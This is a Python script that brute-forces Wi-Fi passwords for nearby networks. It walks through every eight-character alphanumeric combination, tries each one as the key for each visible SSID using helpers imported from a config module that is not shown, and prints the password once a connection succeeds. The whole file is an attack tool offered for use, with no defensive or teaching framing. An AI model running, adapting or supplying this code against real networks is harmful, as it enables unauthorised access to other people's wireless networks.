from config import *
import random
import time

'''
    Python version: 3.8.3
    By: Agostinho Pina Ramos
'''


def searchWIFI(ssid):
    xchars = [
        ['m', 'P', '7', 'N', 'h', 'c', 'd', 'X', 'q', 'W', 'R', 'M', 'A', 't', 's', 'J', 'f', '8', 'Y', 'v', 'i', 'K', 'y', 'E', 'Q', 'V', 'z', 'D', 'S', 'o', 'G', 'x', 'k', 'I', 'Z', 'p', 'g', 'n', 'O', 'H', 'F', 'B', '9', '3', '0', 'C', '5', 'r', 'u', '6', 'l', '1', 'b', '4', '2', 'T', 'w', 'j', 'a', 'L', 'e', 'U'],
        ['c', 'j', 'i', 'M', 'Z', '0', '1', 'V', 'Q', 'K', 'h', '4', 'D', 'a', 'I', 'L', 'E', 'e', 't', 'G', 'n', '5', 'b', 'g', 'o', 'w', 'p', 'v', 'T', 'f', '9', 'W', 'S', '8', 'x', 'B', 'P', '3', 'd', 'U', 's', 'u', 'm', 'X', 'H', 'J', '6', 'q', 'Y', 'F', 'k', 'O', '7', '2', 'C', 'l', 'N', 'R', 'r', 'A', 'z', 'y'],
        ['5', 'k', 'M', 'U', 's', 'Y', '7', 'R', 'E', 'J', '0', 'c', '2', 'r', 'X', '4', 'w', 'B', 'A', 'a', 'L', 'p', 'P', '8', 'q', 'F', 'v', 'C', 'm', 'Z', 'D', 'W', 'b', 'S', 'z', 'h', '9', 'i', 'n', 'e', 'g', 'N', 'u', 'd', 't', 'x', 'G', 'f', 'I', 'o', 'O', '3', 'K', '1', 'j', 'Q', 'l', 'T', 'V', 'H', '6', 'y'],
        ['V', '8', 'J', 'H', 'i', 'N', 'w', 'p', 'I', 't', 'L', '2', 'C', 'y', 'U', '7', 'g', 'Q', '1', 'l', 'T', '4', 'K', 'X', 'S', '3', 'x', 'r', 'A', 'n', 'W', 'P', 'O', '0', 'B', 'd', 'e', 'm', 'Y', 'c', 'j', 'E', 's', 'F', 'h', 'v', 'k', 'q', 'Z', 'R', 'b', 'M', 'u', 'z', 'G', 'o', 'f', 'D', 'a', '9', '5', '6'],
        ['u', 'h', 'O', 't', 'w', 'f', 'L', 'g', 'T', 'j', 'm', 'p', 'y', 'c', 'l', 'F', 'e', '5', 'V', '9', 'A', 'Q', 'i', 's', 'I', 'Y', 'G', 'P', 'B', 'C', 'N', 'E', 'Z', '4', 'K', 'b', 'a', 'n', '0', 'H', 'r', '3', 'U', '7', 'o', 'v', 'R', '1', 'M', 'q', 'W', '2', 'z', 'x', 'S', '6', 'J', 'D', 'd', '8', 'k', 'X'],
        ['6', '1', 't', 'T', 'A', 'H', 'X', '7', '3', 'n', 'j', 'y', 'p', '0', '4', 'U', 'h', 'D', 's', 'i', 'q', 'L', 'w', 'O', 'l', 'Y', 'f', '5', 'E', 'K', 'g', 'P', 'e', 'C', 'J', 'Z', 'M', 'R', 'm', 'a', 'x', 'W', '2', 'Q', 'V', 'G', 'c', 'k', 'v', 'u', 'z', '8', '9', 'I', 'S', 'N', 'r', 'B', 'F', 'd', 'b', 'o'],
        ['H', 'u', 'f', 'W', 'Q', '5', '7', 'X', 'D', 'N', 'U', 'o', 'r', 'P', 'j', '8', '0', 'q', 'R', 't', 'L', 'v', 'i', 'B', 'w', 'J', 'k', 'm', '6', 'C', 'b', '9', 'a', 'G', 'V', 'y', '1', 'F', 'S', 'M', '2', 'd', 'h', '4', 'I', 'x', 'c', 'Z', '3', 'g', 'p', 'T', 'z', 'O', 'A', 'n', 'e', 'l', 's', 'E', 'K', 'Y'],
        ['i', 'k', 'F', 'Y', 'n', 'c', 'V', 'A', 'E', 'H', 'N', '8', 'g', 'l', '6', 'O', 'f', 'U', 'm', '9', 'q', 'B', 'y', '3', 'w', 'e', 'P', 'X', 'j', 't', 'W', 'S', '7', '2', 'o', 'L', 'h', 'C', 'M', '0', 'd', 'D', 'K', '5', 'b', 'T', 's', '4', 'J', 'v', '1', 'G', 'u', 'z', 'Q', 'R', 'Z', 'p', 'I', 'a', 'r', 'x']
    ]

    for d1 in xchars[0]:
        for d2 in xchars[1]:
            for d3 in xchars[2]:
                for d4 in xchars[3]:
                    for d5 in xchars[4]:
                        for d6 in xchars[5]:
                            for d7 in xchars[6]:
                                for d8 in xchars[7]:
                                    pasw = d1+d2+d3+d4+d5+d6+d7+d8 #The password length is 8
                                    print(ssid + ' : ' + pasw)
                                    if mkSense(pasw):
                                        '''
                                        Accepts repetition in maximum of three times
                                        Ex: AAA36274 or AA36A274 or ...
                                        In this case the maximum that letter 'A' can repeat is 
                                        three times.
                                        '''
                                        setWIFI(ssid, pasw)
                                        time.sleep(5)
                                        if is_connected() and is_current(ssid):
                                            print('>>>> ' + SSIDPASS(ssid))
                                            print('\nDone!\n')
                                            return 1
    return 0

r = input('Please disconnect your Wi-Fi before press "F"? ')
if r.lower() == 'f':
    search = ARRSSID() #All networks near my home
    start_time = time.time()
    for ssid in search:
        if(searchWIFI(ssid)==1):
            print("--- %s seconds ---" % (round(time.time() - start_time,3)))
            break
else:
    print("Disconnect internet and try again :(")